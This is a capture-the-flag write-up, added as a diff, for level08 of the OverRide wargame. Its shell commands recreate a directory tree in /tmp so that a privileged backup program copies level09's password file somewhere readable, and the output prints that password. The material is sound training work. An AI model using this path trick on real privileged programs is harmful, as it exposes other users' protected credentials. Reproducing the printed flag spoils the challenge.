@@ -1,0 +1,34 @@
+This level is a bit different! We don't really need to look at the source code, because of the programs behaviour. Let's take a closer look:
+
+```shell
+$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+```
+
+The program tries to open the file we pass as an argument and it's a relative path, which leads to the error. This is easily fixable by simply creating that path. However as we don't have write permissions in the home directory we need to do so in the `tmp` folder.
+
+```shell
+level08@OverRide:/tmp$ mkdir home
+level08@OverRide:/tmp$ cd home
+level08@OverRide:/tmp/home$ mkdir users
+level08@OverRide:/tmp/home$ cd users
+level08@OverRide:/tmp/home/users$ mkdir level09
+```
+
+Now we should be able to run it from here.
+
+```shell
+level08@OverRide:/tmp$ ~/level08 ../home/users/level09/.pass
+level08@OverRide:/tmp$ ls
+backups  hello  home  level09
+level08@OverRide:/tmp$ cd home/users/level09
+level08@OverRide:/tmp/home/users/level09$ ls -llah
+total 4.0K
+drwxrwxr-x 2 level08 level08 60 Sep 13 19:17 .
+drwxrwxr-x 3 level08 level08 60 Sep 13 19:17 ..
+-rw-rw---- 1 level09 users   41 Sep 13 19:17 .pass
+level08@OverRide:/tmp/home/users/level09$ cat .pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
+
+Tada, there's our password!
